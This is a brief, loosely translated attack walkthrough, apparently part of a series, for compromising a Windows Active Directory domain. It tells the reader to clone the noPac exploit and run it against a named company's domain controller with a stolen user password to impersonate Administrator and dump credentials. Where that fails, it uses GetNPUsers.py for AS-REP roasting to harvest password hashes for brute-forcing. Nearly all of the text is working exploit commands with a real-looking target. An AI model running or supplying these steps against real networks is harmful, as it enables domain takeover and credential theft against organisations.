So first of all
git clone https://github.com/Ridter/noPac

Next, we substitute our data
And we try them on every IP where our 88 cd port is present
noPac
python noPac.py rush-enterprises.com/engineering.calendar:password -dc-ip 10.0.0.21 --impersonate Administrator -dump -use-ldap

Next will be a dump of credits as in zerologon
What to do with them next was shown in the first part I will not explain.

If noPac is unlucky, we try to extract the hashed passwords from the domain.
Let's go to the impact in kali

GetNPUsers.py rush-enterprises.com/-users file /home/kali/user.txt -no-pass -dc-ip 192.168.17.72 -request

We put a list of found users in the user file if you are lucky get hashes for brute =)
